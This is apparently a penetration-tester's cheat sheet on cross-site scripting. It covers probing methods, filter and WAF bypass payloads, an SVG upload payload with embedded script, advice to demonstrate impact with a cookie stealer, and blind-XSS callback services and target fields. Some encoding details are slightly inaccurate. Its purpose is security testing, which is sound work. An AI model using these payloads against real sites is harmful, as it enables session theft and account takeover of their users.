<h1>Cross Site Scriping</h1><br>
<h2>first glance methodology </h2>
On a website that allows you to register an account, test every feature avaliable with the payload <.h1>test<./h1>(remove the . it was rendering my h1 tag on this page). Do this on every feature that allows input. <br>
Navigate the application and see if theres any places your H1 tag is interpreted. <br>
View the page source and quickly filter for test and see what encoding is in place on your input. <br>
If tags are filtered but your input is placed within a value="test" can you add test" eventhandler and does the " get filtered? <br>
If your input is directly into a script tag, can you break out the context? E.g. if your input lands within a "var" can you close the var <br>
var srchstring = 'test' - enter test'-alert(1)-' and see what happens. You may need to use a ; after the first ' - test'; -alert(1)-' <br>
Burpsuite allows you to customise scans, create a scan and remove all scans except the scan titled "reflection". Run this on your burp project file to identify all reflected inputs on the web application. <br>
<br>
Never submit a vulnerability with alert(1) show impact, use document.cookie and demonostrate a cookie stealer POC aslong as cookies are not set to httpONLY (not readable by javascript if set). <br>
<br>
<h2>Alert POC Alternatives</h2>
If alert is blocked or filtered, first try confirm(1), print() or prompt(1).<br>
Try URL Encoding the A on alert - %61lert(1). URL each char if this does not work using referemce - https://www.w3schools.com/tags/ref_urlencode.ASP <br>
You dont need a popup for a POC, you can go straight to a cookie stealer POC. <br>
<br>
<h2>Identify what is being blocked</h2>
Can you submit a <.h1> tag but if using xss payload its blocked? Write out the xss payload removing elements at a time? maybe it gets blocked on alert(1) - if so use the alert bypass. Maybe it gets blocked on the event handler? If so copy event handlers to file and use on intruder to see what is allowed? <br>
URL encode characters of the event handler one at a time and see if this successes. <br>
is it being blocked due to the spaces? remove all spaces from the attack payload - <.svg/onload=alert(1)> - <.a/href= - <.h1 id=xonmouseover=alert(1)>test<./h1>
<br>
<br>
<h2>XSS Filter Bypasses</h2> <br>
<b>Remove . from all payloads</b> <br>
Is <.script>alert(1)</script.> filtered? Try: <br>
<.scr<.script>ipt>alert(1)<./scr</script.>ipt> <br>
<.img src=x onerror=alert(1)> <br>
<.svg/onload=alert(1)> <br>
<.h1 id=x onpointermove=alert(1)>test<./h1> <br>
%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E <br>
<.randomfaketag id=x onwheel=alert(1)><br>
<.a href=javascript:alert(1)>click</a.><br>
<.ScRiPt>alert(1)<./ScRiPt><br>
Run through the payload list here on intruder and select grep for url decoded values https://github.com/payloadbox/xss-payload-list/blob/master/Intruder/xss-payload-list.txt <br>
< and > can be replace with html entities &lt; and &gt; <br>
You can try an XSS polyglot <br>
 https://gist.github.com/michenriksen/d729cd67736d750b3551876bbedbe626<br>
Try New Lines to break the firewall - newline URL encoded is %0 - <.script>%0alert(1)</script> - try with different HTML tags <br>
Try double encoding a newline break %2522 <br> 
New Line breaks often work on <.a/href=%2522javascript:alert(1)> <br>
Injecting anchor tag without whitespaces -breaking up characters with decoded value of %26Tab%3B (url decode character) between each character<br>
 Try bypassing spaces with a bullet if / does not work - <code><.svg•onload=alert(1)> </code><br>
 <br>
 <h3> File Upload XSS </h3><br>
 If you find a file upload feature, try naming the file to an xss payload. Use burp intercept to rename files <br>
 Does the app allow .svg files to be uploaded? if yes, enter the code within an svg file <br>
 <code><?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
   <script type="text/javascript">
      alert('XSS!');
   </script>
</svg>
 </code>

<br>
<h2>A href bypasses</h2>
If exploiting <a. href></a> xss and "javasript" is blocked by WAF or URL then try the below. <br>
Add any number of \n \t or \r in the middle <br>
java\nscript: <br>
Add characters from \x00- \x20 at the beginning <br>
\x01javascript: <br>
\00xjavascript: <br>
remove the space with a \ character - <.tag\href><br>
<br>
Randomise the case<br>
jaVAscrIpT:<br>
Can also use the below to get rid of the word JavaScript all together<br>
\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003aalert(1)<br>
\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1)<br>
 <br>
<p align="center">
  <img src="https://pbs.twimg.com/media/Eir5smxXcAcJ4QX?format=jpg&name=large" width="800" height="600" title="hover text">
</p>
<br>


<h2>Blind Xss</h2>
Similar to Reflected Xss Or Stored Xss But you Dont get any reflection, but you get response on you server. <br>
<br>
Similar methods As given above except try putting payload which can give a callback on your server when executed. <br>
You can use https://xsshunter.com/ or Use burpcollaborator or ngrok. <br>
Try it on contact forms or similar functionality. <br>
Tips <br>
<br>
Copy every payload from your xsshunter payloads section and paste it into every field you see <br>
XSS hunter contains a payload for CSP bypass <br>
Generate some variations of your payloads (example replace < with &lt;) <br>
Where to look for Blind XSS…… <br>
1- Review forms <br>
2- Contact Us pages <br>
3- Passwords(You never know if the other side doesn’t properly handle input and if your password is in View mode) <br>
4- Address fields of e-commerce sites <br>
5- First or Last Name field while doing Credit Card Payments <br>
6- Set User-Agent, referr and host header to a Blind XSS payload. You can do that easily from a proxy such as Burpsuite. <br>
7- Log Viewers <br>
8- Feedback Page <br>
9- Chat Applications <br>
10- Any app that requires user moderation <br>
